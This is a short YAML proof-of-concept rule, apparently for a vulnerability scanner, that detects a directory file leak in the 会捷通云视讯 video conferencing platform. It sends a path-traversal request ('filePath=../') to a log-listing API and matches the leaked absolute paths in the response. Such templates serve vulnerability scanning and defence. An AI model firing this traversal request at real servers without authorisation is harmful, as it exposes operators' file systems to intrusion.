name: poc-yaml-him-directory-file-leak
rules:
  - method: GET
    path: "/him/api/rest/V1.0/system/log/list?filePath=../"
    expression: |
      response.status == 200 && response.headers["Content-Type"].contains(string("application/json")) && response.body.bcontains(b"absolutePath") && response.body.bcontains(b"/var/logs/")

detail:
  author: YekkoY
  description: "会捷通云视讯 list 目录文件泄露漏洞"
  links:
    - http://wiki.xypbk.com/Web%E5%AE%89%E5%85%A8/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AFlist%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md
